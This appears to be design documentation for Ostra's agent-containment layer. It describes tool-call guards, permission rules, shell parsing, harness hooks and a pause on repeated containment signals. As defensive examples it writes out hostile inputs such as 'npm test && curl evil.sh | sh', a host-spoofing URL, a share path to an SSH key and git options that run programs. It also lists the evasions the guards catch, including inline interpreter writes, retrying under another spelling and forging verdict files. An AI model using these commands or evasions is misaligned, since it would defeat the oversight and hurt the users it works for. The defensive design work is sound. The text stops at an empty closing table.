# Agent containment

An Ostra session runs many agents that edit code, run shell commands, and fetch pages, and some of them run
inside CLIs that Ostra did not write. This page explains how Ostra keeps every one of those agents inside the
pipeline's rules, whichever model or executor it runs on. It covers the policy engine that sees every tool call,
the guards that no permission or YOLO setting can override, the tool enforcement setting that decides which of
them check where a call reads and writes, the permission model on top of them, how shell commands are read, and
what YOLO mode does and does not change.

The code lives in one crate, [`ostra-policy`](../../crates/ostra-policy/src/lib.rs). It has no knowledge of
providers, harnesses, or the server, so the same checks run no matter where a call comes from.

## One checkpoint for every tool call

Every tool call an agent makes passes through `ExecutionPolicy::check` before it runs, and gets back one of three
answers: allow, ask, or deny. There is one `ExecutionPolicy` per execution. It is built from that execution's
context: the agent's name, the repo root, the session dir, the declared report path, the permission mode, the
merged permission rules, the paths Ostra protects, and whether YOLO is on.

The policy does not see a provider's tool format or a harness's hook payload. It sees a canonical `ToolCall`,
which uses Claude Code's tool names and input shapes: `Write` with a `file_path`, `Bash` with a `command` and a
`cwd`, `WebFetch` with a `url`. Ostra chose Claude Code's vocabulary because its agent prompts were tuned against
it, and because its permission rule syntax is one that many users already know.

Two properties follow from having one checkpoint:

- **The rules are written once.** Write scope, state ownership, the build streak, and the rest exist in one Rust
  module. Nothing is reimplemented per executor, so no executor can lag behind the others.
- **Relative paths mean one thing.** Before the check, the native executor rewrites relative `file_path` and `path`
  values to absolute ones and pins the Bash working directory into `cwd`
  ([`ToolEnv::canonical_call`](../../crates/ostra-tools/src/lib.rs)). The policy checks a path, the user approves
  that path, and the tool writes that path. Resolving a path differently at each step would open a gap between
  what was approved and what ran.

`check` itself is short. It runs layer 1, then layer 2, then applies YOLO:

```rust
pub fn check(&self, call: &ToolCall) -> PolicyDecision {
    let parsed = (call.tool == "Bash")
        .then(|| bash::parse(call.str_field("command").unwrap_or_default()));
    if let Some(d) = self.layer1(call, parsed.as_ref()) {
        return from_denial(d);
    }
    let decision = self.layer2(call, parsed.as_ref());
    // Under YOLO an ask becomes an allow. A denial stays a denial.
    ...
}
```

([`policy.rs`](../../crates/ostra-policy/src/policy.rs))

Every decision names the rule behind it, such as `guard: build-streak`, `permission: Bash(git push *)`,
`permission: mode:plan`, or `permission: read-only`. The Activity view shows that name next to each call, so a
user can always see why a call ran or why it did not.

## Layer 1: guards

Guards protect the pipeline itself. They express facts that must stay true for the engine's records to mean
anything, for example "only the implementer writes the implementer's progress log." They are not about a user's
taste in risk. For that reason no permission rule, no answer to an ask, no permission mode, and no YOLO setting can
override a guard. A guard that YOLO or an "always allow" rule could switch off would be a preference, not a guard.

Each guard is a port of an Ultracode hook, and the source file is named in the comment above its code in
[`guards.rs`](../../crates/ostra-policy/src/guards.rs).

### Tool enforcement

The `tool_enforcement` setting (Rule G1) decides whether Layer 1 also checks *where* a tool call reads and writes.
It is `disabled` by default. Capable models often take a route the location checks cannot follow: one Python
script that edits five files saves four round trips, but its paths are invisible to a guard that reads the paths
a tool call names, so with enforcement on Ostra refuses it outright and the model falls back to one edit per call.

| Guard | Disabled (default) | Enabled |
| --- | --- | --- |
| Write scope, including quick-answer's read-only rule and the `Document` tool's session-dir rule | off | on |
| Report path | off | on |
| Self-protection: writes to Ostra's binary, config, and `workspace.toml`, running `ostra`, and inline interpreter code that writes files or spawns processes | off | on |
| No tests from implementer, state ownership, artifact ownership, workspace artifacts, workspace docs, `Document` tool, git metadata, secret reads, Windows paths | on | on |
| Lesson gate, build streak, management tools, and the subagent coordination gates | on | on |

The choice is a trade between protection and tool calls. `enabled` protects the pipeline from a weaker model
that writes outside its scope, edits Ostra's own files, or misnames its report. It costs more tool calls, because
every refused call is spent and a model that keeps reaching for a script retries until it settles on one edit per
call. `disabled` suits capable models, which rarely make those mistakes and use the saved round trips.

With enforcement disabled the remaining guards still refuse what would corrupt the pipeline's records or leak a
credential. Inline code that names pipeline state (`.state/`, `workspace.db`, a review ledger) is still refused,
and the workspace and registry databases stay unwritable through state ownership. Layer 2 permissions apply in
both modes, and so does the [sandbox](sandboxing.md), which is what bounds a script whose paths the policy cannot
see: it keeps writes inside the workspace, the repo, and the session dirs, keeps Ostra's state files read-only, and
hides Ostra's data and config dirs.

The global value is `tool_enforcement` at the top of `config.toml`. A workspace may replace it with its own
`tool_enforcement`, which is kept in the registry and never in `workspace.toml` (Rule A2), because a repository
must not be able to turn off guards its user turned on. The Permissions tab of workspace Settings sets it. Each
execution resolves the value when it starts
(`WorkspaceSettings::enforces_tool_calls`) and carries it in its context as `enforce_tool_calls`, so a change
applies to the next execution, not to one already running.

### Write scope

This guard applies only with tool enforcement enabled.

Each agent has a region of the disk it may write, and a write outside that region is refused.

| Agent | May write |
| --- | --- |
| explore, generate-spec, fact-check, plan, code-reviewer, EPA | its session dir, and OS temp |
| initializer | `.ostra/` and `.agents/skills/` in the project |
| documentation, system-architecture | their session dir and OS temp; they return the book in their submit call |
| quick-answer | nothing: it answers in its submit call |
| implementer, write-test, and the rest | the repo root and the session dir |

Scope stops two classes of mistakes. A research or review agent that "helpfully" fixes the code it was asked to
read would change the project behind the pipeline's back, so the spec or review would describe code that no longer
exists. An agent that writes outside the repo can damage the user's machine. The guard works on resolved paths, so
`../../etc/x`, `~/.bashrc`, and a symlinked path are judged by where they land, not by how they are spelled.
The allowed regions are resolved the same way. A project that keeps its skills in `skills/` or `.claude/skills/`
and links `.agents/skills` to it lets the initializer write through the link, because both names land in the same
folder. That folder must be inside the repo: a link that leaves the repo lands outside every agent's region. A
write to the older `.ostra/skills/` is refused only when it does not also land in `.agents/skills/`.

A second scope rule applies only to the implementer: it may not write any path that looks like a test
(`*.test.ts`, `tests/`, `*_test.go`, `FooTest.java`, and similar patterns). Tests belong to write-test, which runs
after the user asks for tests at the closing gate. An implementer that edits a test to make it pass has marked its
own work.

### State ownership

The engine keeps records that decide what happens next: gates, verdicts, the review loop's iteration count, the
security block, the implementer's progress log, and the lesson store. The rule is simple: only the writer the
engine expects may write each record.

- Engine state (every session's `.state/` folder) has no writer but the engine.
- The lesson store (`knowledge.sqlite3` and its `-wal`, `-shm`, and `-journal` files) is written only by the
  `Memory` tool, because later sessions recall its contents as fact.
- The review ledger may be written by code-reviewer, implementer, and write-test. The security sentinel may be
  written only by code-reviewer. The progress log may be written only by the implementer.

Without this guard, an agent under pressure could write `{"verdict": "PASS"}` into a state file, or reset the
review ledger to escape the review cap. The denial text says that directly: a hand-written value "would forge a
pipeline decision rather than record one."

Artifact ownership comes next. Spec files belong to generate-spec, plan files to plan, and research files to
explore, so a reviewer cannot rewrite the requirements it is reviewing against. Those three document kinds may also
be changed only through the `Document` tool, never by a plain file write. Ostra renders the Markdown from a typed
JSON document, so a direct edit would be overwritten on the next render and would never show up in the browser.

### Report path

This guard applies only with tool enforcement enabled; the lesson gate on the declared report applies in both
modes.

Many agents are given a `Report file:` in their spawn block, and the next stage reads that exact path. For those
agents, any `ostra-*` file they write in the session tree must be the declared path. An agent that writes
`ostra-review-final.md` when it was told `ostra-review-phase-2.md` has produced a report that nobody will read.
The guard catches it at the moment of the write and tells the agent the right path.

The guard constrains the destination, not the method. A `Write`, a shell heredoc, or a series of appends all pass
as long as they land on the declared path. The denial says so, because a large single write can stall and the
agent should know that chunking it is fine.

### Lesson gate

When an agent has failed a build at least three times in a row and then gets it to pass, it has learned
something that the next session will want. The build observer records that recovery with the diagnostic's
signature, and from then on the agent's report and its `ok` submit are refused until it does one of two things:

- records a lesson with the `Memory` tool (area and a one-line lesson naming the diagnostic and the fix), or
- calls `Report` with a `reason` stating that the fix was situational and teaches nothing reusable.

A `stuck` or `handoff` submit is not blocked. The gate exists so that lessons are recorded while the details are
in context, not to trap an agent that is already asking for help.

### Build streak

The build streak counts consecutive failing build or test commands within one execution. "Build or test command"
means a command that matches the project's configured build and test commands from `project.toml` (placeholders
such as `{MODULE}` match anything), or a built-in list of common tools (`cargo`, `mvn`, `npm run`, `pytest`, and
others) when the project configures none. The policy's observer reads each result after the call runs
([`build.rs`](../../crates/ostra-policy/src/build.rs)).

| Consecutive failures | What happens |
| --- | --- |
| 2 | Memory recall runs on the failure's diagnostic, and any matching lessons are added to the tool result. |
| 3 and 4 | A warning is added to the result: state the root cause before the next attempt, and do not retry a variation of the same edit. It says how many failures remain before the block. |
| 5 | Further build and test commands are refused. The agent is told to submit with status `stuck`. |

Only the build loop is blocked. The agent can still read files and write its hand-back. A pass resets the count,
and a timed-out or interrupted command counts as neither a pass nor a failure, because it carries no evidence. The
exit code wins over output text: `3 failed` printed by a command that exits 0 is a pass.

The guard exists because an agent looping on the same compiler error spends money without making progress. A
`STUCK:` hand-back with the diagnostic and the ruled-out hypotheses lets the engine rescue the phase, either with
the user or with a judge, instead of paying for a sixth and seventh identical try.

### Self-protection

The parts of this guard listed under [tool enforcement](#tool-enforcement) apply only with it enabled. The
refusal of inline code that names pipeline state applies in both modes.

Agents may read Ostra's files but never change them, and may not run Ostra's binary. Protected paths are the
`ostra` binary, its assets, the global config, `workspace.toml`, and the workspace and registry databases with their
journal files. Running `ostra hook` or `ostra mcp-stdio` from a tool call is refused, because those are the
subcommands that talk to the policy, and a caller that runs them could grant itself what the guards withhold.

Self-protection also covers code that the other guards cannot see. The write guards read the paths a tool call
names. An interpreter handed inline code (`node -e`, `python3 -c`, a heredoc piped into `python3`, `echo ... |
node`) names no path at all. So when a command hands code to an interpreter, Ostra scans that code, and it refuses
the command if the code:

- names pipeline state (`ostra-review-ledger*.md`, `.state/`, `knowledge.sqlite3`, `workspace.db`, and so on),
- calls a filesystem write API (`writeFileSync`, `open(..., 'w')`, `shutil.*`, `os.remove`, and others), or
- spawns a process (`child_process`, `subprocess`, `os.system`, `Deno.Command`, and others).

Code that only reads, such as `node -p "require('./package.json').version"`, passes. So does a script file
(`python3 scripts/gen.py`), because a script is a file in the project that the agent's earlier writes were checked
against.

### Further hardening guards

A few guards were added on top of the Ultracode ports during Ostra's security review. They apply in every mode.

- **Git metadata.** Files under `.git/` are written only by git commands, because hooks, `core.fsmonitor`, and a
  gitfile pointing at another repository all make git run programs later.
- **Secret reads.** Agents never read Ostra's data dir (registry, master key, server log), a workspace database
  (which holds every tool output of every session), any execution's harness state (which holds its bridge
  token), or `/proc/<pid>/environ`, `mem`, and `fd`. The check covers file tools and every path-like word of a
  shell command.
- **Workspace artifacts.** Agents read the files in `<workspace>/.ostra/artifacts/` and never write, move, or
  delete them (`guard: workspace-artifacts`), because they belong to the user. A hidden artifact is moved into
  the data dir, so the secret-read guard keeps it from every agent without a list of hidden names
  ([Workspace artifacts](../internals/workspaces.md#workspace-artifacts)).
- **Workspace docs.** Agents read the documentation books in `<workspace>/.ostra/docs/` and never write, move, or
  delete them (`guard: workspace-docs`), because the engine writes each book from the docs stage's submit calls
  (Rule B5). The sandbox mounts the folder read-only as well.
- **Management tools** (`guard: manage-tools`, rule O2). Only the implementer of a phase the approved plan puts
  in a new project may call `ProjectCreate` (`creates_project` in its execution context), only with that
  phase's project key, and only with a well-formed call: a valid key and stack, a purpose and requirements
  within their limits, and a folder relative to the workspace root with no `..`. Every other call is refused,
  because a project changes the workspace for every later session and must follow an approved plan, and the
  shape is checked here so the user is never asked about a call that cannot run. Until the project exists, the
  same guard refuses any write by that run outside its session dir and temp, because there is no project yet
  for its phase to write in.
- **Read-only session.** When a user reopens an ended harness run to look back over it, every tool call in that
  session is refused with `guard: read-only-session`.
- **Windows path forms** (`guard: windows-path`). See the next section.

### Windows paths

The guards work by comparing paths, and Windows has more ways than Linux to name one file. On Windows every path
a tool call names goes through `paths::resolve` ([`paths.rs`](../../crates/ostra-core/src/paths.rs)), which opens
it the way a Win32 program would:

- `..` applies lexically, before links, because Win32 collapses it before the file system sees the path.
- Junctions and symlinks are followed, dangling ones included. A junction needs no privilege, so an agent can make
  one inside the repo that leads out of it; the write lands at the target, and the guard judges the target.
- The longest existing ancestor comes back in its real letter case, with long names in place of 8.3 short names
  (`PROGRA~1`), and without the `\\?\` prefix.
- Trailing dots and spaces are dropped from each name, and so is an alternate data stream suffix, as Win32 does:
  `.git\config.` and `.git\config ` both open `.git\config`.

The guards then compare the folded form (`paths::fold`): separators become `\`, and each character is uppercased
and then lowercased, so two names NTFS treats as one always compare equal (`.GIT\Hooks` is `.git\hooks`). The
permission rules match the same way, case-insensitively.

A few forms are refused outright rather than compared, because each can name a protected file under a spelling
the guards would not recognize:

| Form | Example |
| --- | --- |
| A network or administrative share | `\\localhost\C$\Users\me\.ssh\id_ed25519` |
| A device or object namespace path | `\\.\PhysicalDrive0`, `\\?\GLOBALROOT\...`, `\??\C:\...` |
| A path relative to a drive's own working directory | `C:foo` |
| An alternate data stream | `notes.txt:hidden` |
| A device name as a file name | `CON`, `COM1.txt`, `LPT1` (not `NUL`, which is harmless) |

Git Bash names paths the MSYS way. Before a Bash command's paths reach the guards, `/c/Users/me` becomes
`C:\Users\me` and `/tmp` becomes Git's `%TEMP%` (`paths::from_msys`), so a write to `/c/Users/me/.bashrc` is judged
as the file it opens. A Bash write target with a `..` right after a junction or symlink is refused, because Git Bash
applies that `..` to the link's target while Win32 applies it to the link's own folder, and the guard cannot judge
both. The fixtures `windows_spellings_of_a_git_path_are_all_caught`,
`windows_spellings_of_a_protected_file_are_all_caught`, `msys_paths_in_bash_resolve_to_windows_paths`,
`junctions_cannot_lead_writes_out_of_the_repo`, and `windows_credential_stores_are_never_read` in
[`tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs) run on Windows.

## Layer 2: permissions

A call that passes every guard reaches the permission layer. This layer is about the user's risk tolerance, and it
follows Claude Code's permission model closely, so that a user who knows one knows the other
([`perms.rs`](../../crates/ostra-policy/src/perms.rs)).

### Modes

| Mode | Behavior |
| --- | --- |
| `default` | Reads run. Edits to the project, and commands that are not known to be read-only, ask. |
| `acceptEdits` | Edits inside the project run. So do `mkdir`, `touch`, `cp`, and `mv` whose targets are inside the project. Other commands ask. |
| `plan` | Read-only. Anything that would write or run an unknown command is refused, with a message telling the agent to put its findings in its report. |
| `bypass` | No asks. Everything layer 1 allows runs. |

Writes into the session dir and OS temp never ask in any mode, because they are scratch space the agent owns.

### Rules

Rules come in three lists, `allow`, `ask`, and `deny`, merged from three scopes in order: global config, workspace,
and session. When several rules match, deny beats ask, and ask beats allow.

```toml
[permissions]
allow = ["Bash(npm run test *)", "Edit(src/**)", "WebFetch(domain:docs.rs)"]
ask   = ["Bash(npm publish *)"]
deny  = ["Bash(git push *)", "Read(~/.ssh/**)"]
```

- A `Bash(...)` rule is a glob over one simple command. A trailing ` *` also matches the bare command.
- A path rule is gitignore-style. `//x` is absolute, `~/x` is under home, `x/y` is relative to the repo root, and a
  bare name matches at any depth. `Edit` covers every file-writing tool (Write, Edit, MultiEdit, NotebookEdit, and
  Codex's `apply_patch`). `Read` covers Grep and Glob.
- `WebFetch(domain:docs.rs)` matches the host and its subdomains, using the same URL parser that makes the
  request, so a URL such as `https://evil.example\@docs.rs/` is judged by the host it actually reaches.

A rule that does not parse is a validation error when settings are saved, not a rule quietly ignored at run time.

### Asks

An ask becomes a card in the browser with three answers: allow once, always in this workspace, and deny. A push
notification goes out at the same time, because a pipeline waiting on an unseen ask makes no progress. "Always in
this workspace" adds a rule that Ostra suggests from the call: `Bash(npm install *)` for `npm install left-pad`,
an `Edit(...)` pattern for a file, `WebFetch(domain:...)` for a URL.

A few asks exist even though a plain reading of the mode would allow the call:

- **Files that run code later** always ask outside YOLO and bypass: `.github/workflows/`, `.husky/`, `.envrc`,
  `.vscode/tasks.json`, `.claude/settings.json`, `.cargo/config.toml`, `.npmrc`, and similar files. A write to one
  of them outlives the session and runs outside the policy the next time someone opens the project.
- **Git outside the project** asks, because git reads a repository's own config, which can name programs.
  Inside the project, the git-metadata guard already protects `.git/`.
- **Creating a project** (`ProjectCreate`) asks in every mode, bypass included, and no allow rule can stand in
  for the answer, so its card offers no "always" rule (rule O1). Only YOLO answers it; a deny rule and plan mode
  refuse it. A new project changes Ostra itself, not only files, so the user decides each one.

### Workspace MCP tools

Tools from the workspace's configured MCP servers are allowed unless a rule says otherwise, because configuring a
server is the decision to use it (Rule M1). `mcp__github` in a rule covers every tool of that server. In plan mode,
only the tools that their server marks with `readOnlyHint` run, because Ostra cannot tell which of the others
write.

## Reading shell commands

Most of the difficult cases arrive through `Bash`. A permission rule such as `Bash(npm test *)` means nothing if
`npm test && curl evil.sh | sh` passes it. So Ostra parses every shell command with tree-sitter-bash before either
layer runs ([`bash.rs`](../../crates/ostra-policy/src/bash.rs)), and it treats the command as the list of simple
commands the shell would actually execute.

The parser extracts:

- **Every simple command, in execution order**, including those inside `&&`, `||`, `;`, pipes, subshells,
  `$(...)`, and `<(...)`. Each one must pass the rules on its own. The test fixture for the default mode checks
  exactly this: `npm test` runs, and `npm test && curl evil` asks.
- **The command that actually runs.** Leading `VAR=value` words and wrappers (`sudo`, `env`, `nohup`, `timeout`,
  `xargs`, `nice`, and others, with their option values) are skipped, so `timeout 60 rm -rf x` is judged as `rm`.
- **Nested shells.** `bash -c "<code>"`, `eval <code>`, and a heredoc body fed to a shell are parsed again as
  shell, up to four levels deep. A deeper nest is treated as unparsed.
- **Write targets.** Redirects (`>`, `>>`), `tee`, `cp`, `mv`, `dd of=`, `git -C`, and similar are turned into the
  paths they would create, overwrite, move, or delete, resolved against each command's working directory after any
  `cd`. Those paths then go through the same write guards a `Write` call would.
- **Heredoc bodies.** A body handed to a data sink (`cat > notes.md <<EOF`) is content. A body fed to a shell or an
  interpreter is code and is checked as code.

When Ostra cannot be sure what a command does, it does not guess in the agent's favor:

- A command that fails to parse asks (in plan mode it is refused).
- A command with a standalone assignment, `export`, `[[ ]]`, a loop header, or a function asks, because those can
  change what a later command runs (`PATH`, `GIT_CONFIG_*`) or run code while they are evaluated.
- A write target that only the shell can resolve, such as `"$HOME/.bashrc"`, `~/.bashr?`, or `$(echo ~/x)`, is
  never allowed without an ask, in any mode, because its path was never checked.

### What counts as read-only

A small set of commands runs without asking in every mode: `ls`, `cat`, `head`, `grep`, `rg`, `find`, `git status`,
`git diff`, `git log`, and a few others. The set is narrow, and a command qualifies only when Ostra fully
understands it, because each of these tools has an option that runs a program or writes a file:

| Looks harmless | Why it asks |
| --- | --- |
| `git -c core.fsmonitor=id status` | `-c` sets config that names a program |
| `GIT_EXTERNAL_DIFF=id git diff` | an assignment changes what runs |
| `rg --pre sh foo` | `--pre` runs a program on every file |
| `sort -uo out.txt x` | `-o` writes a file, even inside a short-option cluster |
| `find . -name '*.tmp' -delete` | `-delete`, `-exec`, and `-fprint` act on files |
| `./cat x` | a path-named command can be a script the agent wrote |
| `rg foo *` | a glob can expand to an option |

These cases come from the fixture `only_fully_understood_commands_are_read_only` in
[`tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs), which asserts that each of them is not allowed
unasked in default and plan mode.

### PowerShell and Cmd

On Windows, agents also get a `PowerShell` and a `Cmd` tool, and harnesses bring their own: Claude Code's
`PowerShell` tool, and Codex, which runs its shell commands in PowerShell there. Ostra's parser reads only bash, so
it cannot split a PowerShell or cmd command into simple commands or find its write targets. These tools get every
other part of the Bash tool's hardening, and the policy treats the rest the way it treats a Bash command it could
not parse:

- **Never allowed without asking.** No command of these tools counts as read-only, and a write target is never
  known, so default and accept-edits mode ask, plan mode refuses, and only bypass, YOLO, or an allow rule such as
  `PowerShell(Get-ChildItem *)` lets one run unasked.
- **Refused when the text names what no agent touches.** Layer 1 scans the raw command (`check_opaque_shell` in
  [`guards.rs`](../../crates/ostra-policy/src/guards.rs)) for pipeline state names (`ostra-review-ledger.md`,
  `workspace.db`, and the rest), and resolves every path in it, in drive and backslash form as well as with `/`.
  A path into Ostra's data dir or a credential store is refused as a secret read, and a path to engine state is
  refused as self-protection, in every mode, YOLO included. With tool enforcement enabled, a path to Ostra's
  binary, config, or databases is refused too.
- **The same process hardening.** The configured credential variables and every `OSTRA_*` variable are removed
  from the child, the working dir persists between calls, and the whole process tree is killed when the call ends
  or times out.

A Codex shell call on Windows reaches the policy as `Bash` only when its argv starts `bash` or `sh`, and as
`PowerShell` otherwise, so a PowerShell command is never read as bash. Prefer the Bash tool: the tools' own
descriptions tell agents so, because only a Bash command gets its writes checked path by path. The fixture
`powershell_and_cmd_are_opaque_and_hardened` covers these rules.

## Harness executors get the same policy

A harness executor runs an agent inside Claude Code, Codex, Grok Build, or Antigravity. Those CLIs have their own
tools, which Ostra did not write, so Ostra enforces its policy through each CLI's hook system instead.

For each harness execution, Ostra writes a hook config that sends every PreToolUse and PostToolUse event to
`ostra hook --execution <id>`, a subcommand of the same binary. That subprocess forwards the payload, with the
execution's token, to the server's `/internal/policy` endpoint, which accepts local peers only. There, a
per-harness adapter turns the payload into a canonical `ToolCall`
([`adapters/`](../../crates/ostra-exec-harness/src/adapters/mod.rs)):

| Harness | Its call | Canonical call |
| --- | --- | --- |
| Codex | `exec_command` with `cmd: ["git", "status"]` | `Bash` with `command: "git status"` (each word shell-quoted, so the policy sees the words Codex runs) |
| Codex | `apply_patch` | `ApplyPatch`, whose `*** Update File:` lines become write targets |
| Grok Build | `search_replace` with `filePath` | `Edit` with `file_path` |
| Grok Build | `run_terminal_command` | `Bash`, with the payload's `cwd` |
| Any | `mcp__ostra__report`, `ostra/report`, `mcp_ostra_report` | `Report` |

From that point, the harness call goes through the same `ExecutionPolicy::check` as a native call. The adapter then
turns Ostra's answer into the exact response shape that harness accepts: `hookSpecificOutput` for Claude Code, a
top-level `decision` for Antigravity, and so on. An ask never reaches the harness. Ostra resolves it in the browser
first and sends back allow or deny, because nobody watches the terminal for a harness's own permission prompt.

The adapters also refuse some calls before the policy sees them:

- **Subagent spawns** (`Task`, `Agent`, `spawn_agent`, and the like), because every Ostra agent is a leaf, and a
  delegated task would run outside the guards and its result would never reach the engine.
- **User questions** (`AskUserQuestion` and the like). The agent is told to put the question in its submit call,
  because Ostra asks the user from a pipeline gate.
- **Truncated input.** Grok Build replaces `toolInput` with a truncated string once a payload passes 128 KiB. A call
  that cannot be read cannot be judged, so it is refused with a note to split it.

The bridge never fails open. An unknown execution, a wrong token, a hook from the wrong harness, an unreachable
server, or an unreadable answer all deny the PreToolUse event. Outside an Ostra execution (no `$OSTRA_EXECUTION` in
the environment) `ostra hook` does nothing, because the Antigravity integration is installed globally and must not
affect the user's own sessions.

The Codex adapter shows the canonical shape: whatever form the command arrives in, the policy gets `Bash` and a
`command` string.

```rust
"Bash" | "exec_command" | "shell" | "local_shell" => {
    let command = match input.get("command").or_else(|| input.get("cmd")) {
        Some(Value::String(s)) => s.clone(),
        // Quoted, so the policy sees the words Codex runs, not a re-split line.
        Some(Value::Array(parts)) => parts.iter().filter_map(Value::as_str)
            .map(crate::launch::shell_quote).collect::<Vec<_>>().join(" "),
        _ => String::new(),
    };
    ToolCall::new("Bash", with_cwd(json!({"command": command}), cwd))
}
```

([`adapters/codex.rs`](../../crates/ostra-exec-harness/src/adapters/codex.rs))

Workspace MCP tools take one path in a harness. The harness reaches them only through Ostra's own MCP server, so
the hook passes those calls through, and the MCP handler checks, asks, runs, and logs each call once (Rule M2).
Checking at both points would ask the user twice for one call.

The policy is not the only layer around a harness. Ostra also runs agent commands and each harness CLI inside an
OS sandbox (bubblewrap on Linux, Seatbelt on macOS), which limits what the CLI and its children can reach on disk,
including actions no hook reports. On Linux and macOS the default mode, `required`, refuses to start an execution the
machine cannot sandbox; Windows has no sandbox yet and defaults to `auto`. [Sandboxing](sandboxing.md) covers the profile, the modes, and what is lost without it.

## Why a denial leads with the correction

Every denial is written for the model that will read it, and it starts with what to do instead:

> Record lessons with the Memory tool instead of writing ".../knowledge.sqlite3": the lesson store is written only
> by that tool, because later sessions recall it as fact.

> Write your report to ".../ostra-review-phase-2.md" instead: "ostra-review.md" is not this execution's declared
> report path, and the next stage reads that exact path.

There are two reasons.

The first is mechanical. Grok Build clips deny and ask reasons to 256 characters. A reason that opens with
background and ends with the fix loses the fix. Ostra's Grok adapter shortens a long reason by keeping its head and
its final sentence (`fit_reason` in [`adapters/grok.rs`](../../crates/ostra-exec-harness/src/adapters/grok.rs)),
and that works only because the head is the correction.

The second is behavioral. A model that is told only "denied" tends to retry the same action under another spelling:
a `Write` becomes a heredoc, the heredoc becomes `python3 -c`. A model that is told the allowed alternative takes
it. The reason clause after the correction explains why the rule exists, so the model can apply it to the next
case the message did not name. This follows Ostra's writing rules for all model-facing text: the instruction first,
then the reason, and keep the "because."

Each denial also carries the rule's name. The native executor shows the model
``Denied by guard `build-streak`: ...``, and the hook bridge appends `(Ostra guard: build-streak)`, so the model, the Activity view,
and a user reading a transcript all see the same rule.

## A denial, end to end

The fixture `build_streak_forces_escalation_at_five` in
[`tests/policy.rs`](../../crates/ostra-policy/tests/policy.rs) plays through one build loop. The project profile
names Maven commands, and an implementer compiles five times, each failing on `cannot find symbol`.

```rust
let p = ExecutionPolicy::new(
    f.ctx(AgentName::Implementer),
    PolicyInputs {
        build_commands: vec!["./mvnw -q -T1C compile".into()],
        test_commands: vec![
            "./mvnw test -Ptest".into(),
            "./mvnw test -Ptest -pl {MODULE} -am -Dtest={TEST}".into(),
        ],
        ..Default::default()
    },
);
// Attempts 1 to 5: each compile is allowed, then observed as a failure.
...
assert_eq!(p.build_streak(), 5);
let r = denied(&p, &bash("./mvnw -q -T1C compile"), "5 consecutive build or test failures");
assert!(r.starts_with("Call submit_implementer with status `stuck` (the STUCK: hand-back)"));
denied(&p, &bash("./mvnw test -Ptest -pl core -am -Dtest=FooTest"), "STUCK");
allowed(&p, &bash("cat src/main/java/Foo.java"));
```

What the agent sees along the way:

1. **Attempt 2.** The observer runs memory recall on the normalized diagnostic. If an earlier session recorded a
   lesson about that `cannot find symbol`, it is appended to the tool result, so a known fix arrives before the
   warning.
2. **Attempts 3 and 4.** The result ends with a warning: state the root cause and what will change before the next
   attempt, the same diagnostic is repeating, and further build commands are refused after the fifth failure.
3. **Attempt 6.** The compile never runs. The agent receives:

   > Call submit_implementer with status \`stuck\` (the STUCK: hand-back) instead of another build or test
   > command: 5 consecutive build or test failures in this run, last diagnostic: "cannot find symbol ...".
   > Retrying is not the next step, because you do not yet have the information the fix needs. In the submit call
   > give what you were making work, the failing command, the diagnostic verbatim, the hypotheses you ruled out,
   > and the fact or decision you need. Do not retry under a different spelling of the command.

   A different test command matching the `{MODULE}` template is refused too, while `cat` still runs, because the
   agent needs to read in order to write a useful hand-back.

The same fixture continues past the block. When a later compile passes, the streak resets and a lesson is
pending, so the implementer's next `ok` submit is refused by the lesson gate until it records what fixed the build.

## Containment signals pause the session

A guard stops one tool call, and the agent reads the correction and moves on. Most refusals are ordinary
mistakes, such as a write outside the phase's scope. A few look like an attempt to leave the sandbox: reading
Ostra's secrets, changing Ostra's own files, writing into `.git/`, connecting to a local network address, or
opening a decoy credential file.
When one execution does those three times, Ostra pauses the session for the user, because a model that keeps
trying has usually been told to by something it read (Rule P3).

A containment signal is one of:

- a Layer 1 denial by the `secret-read`, `self-protection`, or `git-metadata` guard,
- an egress proxy refusal of a loopback, private, or link-local destination (`10.0.0.1`, the cloud metadata
  address `169.254.169.254`, a local-only name such as `printer.local`, or a name that resolves to such an
  address). Only requests through the proxy count. On Linux a connection to `127.0.0.1` stays on the sandbox's
  own loopback and never reaches the proxy; on macOS a direct connection to the Mac's own services is allowed
  or refused by the workspace's loopback setting, without a signal, or
- a process in the sandbox opening one of the decoy credential files Ostra plants in hidden paths, such as
  `~/.ssh/id_rsa` (see [sandboxing](sandboxing.md#decoy-credential-files)). This covers what the
  `secret-read` guard cannot see: a `cat` in Bash, a script, or a child process. On macOS only on an admin
  account and for decoy paths where a file exists, because the report comes from the system log.

A refused public host is not a signal, because builds and CLIs call telemetry hosts on their own. It is still
recorded with the execution's activity, with the setting that would allow it.

[`containment::classify`](../../crates/ostra-core/src/containment.rs) turns each execution delta into a signal or
nothing. The runner records each signal as a `ContainmentSignal` event, at most three per execution, so a retry
loop cannot flood the session log. The proxy reports each host and port once, so three signals from the proxy are
three different destinations. On the third signal of one execution, the fold pauses the session exactly as the
user's Pause does (Rules P1 and P2): every running execution is interrupted, waiting permission asks are denied,
and nothing new starts. The board names the agent whose execution paused the session, and a push notification
says why.

Continuing the session is the user's "this was fine". The interrupted run resumes where it stopped, as the
same execution, and its signal count starts again at zero. Stopping the session ends it. The fixtures
`p3_three_containment_signals_pause_the_session`, `p3_decoy_opens_are_signals_like_the_others`,
`p3_a_resumed_execution_counts_signals_from_zero`, and
`p3_two_signals_or_signals_spread_over_executions_do_not_pause` pin the rule, and `containment_signals_pause_the_session` in
[`crates/ostra-engine/tests/pause.rs`](../../crates/ostra-engine/tests/pause.rs) runs it on a real engine.

## What YOLO changes, and what it does not

YOLO hands every decision to the orchestrator so that a session can run without a person at the screen. In the
policy it does one thing: the session behaves as `bypass` mode, and every ask becomes an allow, recorded as
`permission: yolo`. Because YOLO replaces the mode, a session in plan mode that turns YOLO on also loses plan
mode's read-only refusals.

YOLO does not change anything that is not a question:

- **Every guard still applies.** The fixture `yolo_answers_asks_but_not_denials` turns YOLO on and checks that the
  implementer still cannot write `src/a.test.ts`.
- **Explicit deny rules still apply.** In the same fixture, `Bash(git push *)` in the deny list still refuses
  `git push origin main` under YOLO. A deny rule is the user saying "never," and YOLO answers questions, not
  standing orders. Whether YOLO should ever lift a deny rule is still listed as an open item for the user to
  confirm.
- **The pipeline's own requirements hold.** Approval still needs a fact-check PASS, BLOCKER security findings must
  still be fixed before completion, and a budget gate is never answered by YOLO.
- **Containment signals still pause.** A session that trips three containment signals in one execution pauses
  under YOLO too, and only the user can continue it.

YOLO can be turned on or off during a session. The policy reads the session's current setting before every check
(`policy.set_yolo(host.yolo())` in both executors), so the change applies from the next tool call.

## Where to look in the code

| Topic | File |
| --- | --- |
